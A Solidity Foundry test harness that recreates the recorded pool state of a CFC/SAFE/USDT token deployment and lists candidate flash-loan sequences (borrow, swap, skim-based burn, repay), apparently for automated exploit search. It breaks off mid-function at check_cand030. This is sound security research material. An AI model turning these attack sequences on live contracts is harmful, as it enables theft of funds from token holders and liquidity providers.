// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {CFC} from "./CFC.sol";
import {SAFE} from "./SAFE.sol";
import {USDTCFC} from "./USDTCFC.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract CFCTest is Test, BlockLoader {
    USDT usdt;
    SAFE safe;
    CFC cfc;
    UniswapV2Pair safeusdtPair;
    UniswapV2Pair pair;
    USDTCFC usdtcfc;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address safeAddr;
    address cfcAddr;
    address safeusdtPairAddr;
    address pairAddr;
    address usdtcfcAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1686812805;
    uint112 reserve0safeusdtPair = 97465121886619415513006;
    uint112 reserve1safeusdtPair = 489503510554930476393732;
    uint32 blockTimestampLastsafeusdtPair = 1686812772;
    uint256 kLastsafeusdtPair = 47486313626300851357233065832927614284807383768;
    uint256 price0CumulativeLastsafeusdtPair =
        1289939749702297086941886408175762837312088370;
    uint256 price1CumulativeLastsafeusdtPair =
        19813834967984668036434544980989284471792;
    uint112 reserve0pair = 3466655815335789642356;
    uint112 reserve1pair = 100246518127533892079722;
    uint32 blockTimestampLastpair = 1686812598;
    uint256 kLastpair = 548155965428649915691831589164812341266909168;
    uint256 price0CumulativeLastpair =
        210605282325395173002590957195716466715171;
    uint256 price1CumulativeLastpair = 272801197874040290279645040961546599365;
    uint256 totalSupplysafe = 931155431591721766722529;
    uint256 balanceOfsafesafeusdtPair = 97465121886619415513006;
    uint256 balanceOfsafepair = 3466655815335789642356;
    uint256 balanceOfsafeattacker = 0;
    uint256 totalSupplycfc = 3100000000000000000000000;
    uint256 balanceOfcfcsafeusdtPair = 0;
    uint256 balanceOfcfcpair = 100246518127533892079722;
    uint256 balanceOfcfcattacker = 0;
    uint256 totalSupplyusdt = 3379997906401637314353418691;
    uint256 balanceOfusdtsafeusdtPair = 489503510554930476393732;
    uint256 balanceOfusdtpair = 0;
    uint256 balanceOfusdtattacker = 0;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        safe = new SAFE();
        safeAddr = address(safe);
        cfc = new CFC(address(safe));
        cfcAddr = address(cfc);
        usdtcfc = new USDTCFC();
        usdtcfcAddr = address(usdtcfc);
        safeusdtPair = new UniswapV2Pair(
            address(safe),
            address(usdt),
            reserve0safeusdtPair,
            reserve1safeusdtPair,
            blockTimestampLastsafeusdtPair,
            kLastsafeusdtPair,
            price0CumulativeLastsafeusdtPair,
            price1CumulativeLastsafeusdtPair
        );
        safeusdtPairAddr = address(safeusdtPair);
        pair = new UniswapV2Pair(
            address(safe),
            address(cfc),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(safeusdtPair),
            address(pair),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(safeusdtPair), balanceOfusdtsafeusdtPair);
        safe.transfer(address(safeusdtPair), balanceOfsafesafeusdtPair);
        safe.transfer(address(pair), balanceOfsafepair);
        cfc.transfer(address(pair), balanceOfcfcpair);
        cfc.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(usdt),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(usdt), cfc.decimals());
        emit log_string("");
        emit log_string("Safe Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(safe),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(safe),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(safe), cfc.decimals());
        emit log_string("");
        emit log_string("Cfc Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(cfc), usdt.decimals());
        queryERC20BalanceDecimals(address(safe), address(cfc), safe.decimals());
        queryERC20BalanceDecimals(address(cfc), address(cfc), cfc.decimals());
        emit log_string("");
        emit log_string("Safeusdtpair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(safeusdtPair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(safeusdtPair),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(safeusdtPair),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(pair),
            safe.decimals()
        );
        queryERC20BalanceDecimals(address(cfc), address(pair), cfc.decimals());
        emit log_string("");
        emit log_string("Usdtcfc Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdtcfc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(usdtcfc),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(usdtcfc),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(safe),
            address(attacker),
            safe.decimals()
        );
        queryERC20BalanceDecimals(
            address(cfc),
            address(attacker),
            cfc.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_safe_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        safe.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_safe_owner(uint256 amount) internal eurus {
        safe.transfer(owner, amount);
    }

    function borrow_cfc_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        cfc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_cfc_owner(uint256 amount) internal eurus {
        cfc.transfer(owner, amount);
    }

    function swap_safeusdtPair_attacker_safe_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safe.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_safeusdtPair_attacker_usdt_safe(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_pair_attacker_safe_cfc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safe.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_cfc_safe(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        cfc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_cfc_pair(uint256 amount) internal eurus {
        cfc.transfer(address(pair), amount);
        pair.skim(attacker);
        amount /= 2;
        cfc.transfer(address(pair), amount);
        pair.skim(attacker);
    }

    function swap_usdtcfc_attacker_usdt_cfc(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(safeusdtPair), amount);
        safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
        uint256 amountOfSafe = safe.balanceOf(attacker);
        safe.transfer(address(pair), safe.balanceOf(attacker));
        pair.swap(
            1,
            pair.getAmountOut(amountOfSafe, address(safe)),
            attacker,
            new bytes(0)
        );
    }

    function swap_usdtcfc_attacker_cfc_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        cfc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
        uint256 amountOfSafe = safe.balanceOf(attacker);
        safe.transfer(address(safeusdtPair), safe.balanceOf(attacker));
        safeusdtPair.swap(
            0,
            safeusdtPair.getAmountOut(amountOfSafe, address(safe)),
            attacker,
            new bytes(0)
        );
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt5 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        payback_safe_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt5 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        payback_cfc_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_pair_attacker_safe_cfc(amt4, amt5);
        swap_usdtcfc_attacker_cfc_usdt(amt6, amt7);
        payback_usdt_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_pair_attacker_cfc_safe(amt4, amt5);
        swap_safeusdtPair_attacker_safe_usdt(amt6, amt7);
        payback_usdt_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt7 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        payback_safe_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_cfc_safe(amt6, amt7);
        payback_safe_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
        swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt7 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        payback_safe_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_safe_owner(amt0);
        burn_cfc_pair(amt1);
        swap_pair_attacker_safe_cfc(amt2, amt3);
        swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
        swap_safeusdtPair_attacker_usdt_safe(amt6, amt7);
        payback_safe_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_safe_owner(amt0);
        swap_pair_attacker_safe_cfc(amt1, amt2);
        swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_pair_attacker_cfc_safe(amt7, amt8);
        payback_safe_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt7 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        payback_cfc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_cfc_owner(amt0);
        burn_cfc_pair(amt1);
        swap_pair_attacker_cfc_safe(amt2, amt3);
        swap_safeusdtPair_attacker_safe_usdt(amt4, amt5);
        swap_usdtcfc_attacker_usdt_cfc(amt6, amt7);
        payback_cfc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_pair_attacker_cfc_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_pair_attacker_safe_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt7 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        payback_cfc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt8 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_safe_cfc(amt6, amt7);
        payback_cfc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_cfc_owner(amt0);
        swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
        swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
        payback_cfc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
        swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_pair_attacker_safe_cfc(amt4, amt5);
        swap_pair_attacker_cfc_safe(amt6, amt7);
        swap_safeusdtPair_attacker_safe_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_cfc_safe(amt6, amt7);
        swap_safeusdtPair_attacker_safe_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
        swap_pair_attacker_safe_cfc(amt3, amt4);
        swap_pair_attacker_cfc_safe(amt5, amt6);
        swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
        swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        swap_pair_attacker_safe_cfc(amt5, amt6);
        swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        burn_cfc_pair(amt3);
        swap_pair_attacker_cfc_safe(amt4, amt5);
        swap_pair_attacker_safe_cfc(amt6, amt7);
        swap_usdtcfc_attacker_cfc_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(29668034);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
        swap_pair_attacker_cfc_safe(amt3, amt4);
        burn_cfc_pair(amt5);
        swap_pair_attacker_safe_cfc(amt6, amt7);
        swap_usdtcfc_attacker_cfc_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
